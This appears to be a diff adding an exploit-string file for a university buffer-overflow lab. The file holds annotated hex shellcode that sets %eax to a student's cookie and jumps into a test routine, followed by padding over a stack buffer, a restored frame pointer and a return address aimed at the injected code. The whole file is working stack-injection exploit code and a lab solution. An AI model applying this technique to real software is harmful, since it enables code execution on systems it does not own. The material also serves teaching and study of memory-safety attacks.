@@ -1,0 +1,10 @@
+/* 0x55682ff8 starting point */
+b8 5a 44 02 7d      /* mov    $0x7d02445a,%eax ; set %eax to my cookie(sp04) */
+ba be 8d 04 08      /* mov    $0x8048dbe,%edx ; set %edx to the next instruction in test */
+ff e2               /* jmp    *%edx */
+            00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* local buffer -0x28(%ebp) */
+50 30 68 55 /* former ebp 0x55683050 */
+f8 2f 68 55 /* starting point of this buffer on the stack */
